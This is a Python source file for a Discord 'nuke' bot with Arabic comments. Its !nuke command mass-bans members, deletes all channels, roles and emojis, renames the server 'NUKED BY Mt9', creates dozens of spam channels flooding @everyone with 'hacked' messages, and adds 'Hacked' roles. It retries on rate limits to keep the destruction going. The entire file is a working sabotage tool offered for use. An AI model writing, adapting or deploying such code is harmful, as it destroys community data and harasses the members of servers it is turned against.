import os
import discord
import requests
import time
import threading
from flask import Flask
from discord.ext import commands

app = Flask(__name__)
@app.route('/')
def home(): return "Bot is running!"

TOKEN = os.getenv("BOT_TOKEN")
BASE_URL = "https://discord.com/api/v9"
HEADERS = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

def send_request(method, url, json=None):
    while True:
        r = method(url, headers=HEADERS, json=json)
        if r.status_code == 429:
            time.sleep(r.json().get("retry_after", 1))
        else: return r

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    
    # 1. حظر جميع الأعضاء
    for member in guild.members:
        if member.id != bot.user.id and member.id != guild.owner_id:
            try: await member.ban(reason="NUKED BY Mt9")
            except: pass

    # 2. حذف القنوات
    channels = requests.get(f"{BASE_URL}/guilds/{guild.id}/channels", headers=HEADERS).json()
    for ch in channels:
        send_request(requests.delete, f"{BASE_URL}/channels/{ch['id']}")
    
    # 3. حذف الأدوار
    roles = requests.get(f"{BASE_URL}/guilds/{guild.id}/roles", headers=HEADERS).json()
    for role in roles:
        if role['name'] != "@everyone" and not role['managed']:
            send_request(requests.delete, f"{BASE_URL}/guilds/{guild.id}/roles/{role['id']}")
            
    # 4. حذف الإيموجي
    emojis = requests.get(f"{BASE_URL}/guilds/{guild.id}/emojis", headers=HEADERS).json()
    for e in emojis:
        send_request(requests.delete, f"{BASE_URL}/guilds/{guild.id}/emojis/{e['id']}")

    # 5. تغيير إعدادات السيرفر
    send_request(requests.patch, f"{BASE_URL}/guilds/{guild.id}", {"name": "NUKED BY Mt9", "icon": None})
    
    # 6. إنشاء قنوات وسبام مكثف
    for i in range(50):
        res = send_request(requests.post, f"{BASE_URL}/guilds/{guild.id}/channels", {"name": "nuked-by-mt9", "type": 0})
        if res.status_code == 201:
            ch_id = res.json()['id']
            for _ in range(5):
                send_request(requests.post, f"{BASE_URL}/channels/{ch_id}/messages", {"content": "@everyone @here تم التهكير من Mt9!!"})

    # 7. إضافة رتب تخريبية
    for i in range(20):
        send_request(requests.post, f"{BASE_URL}/guilds/{guild.id}/roles", {"name": f"Hacked-{i}", "color": 0xFF0000})

    await ctx.send("تمت عملية التخريب بنجاح.")

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))).start()
    bot.run(TOKEN)
    
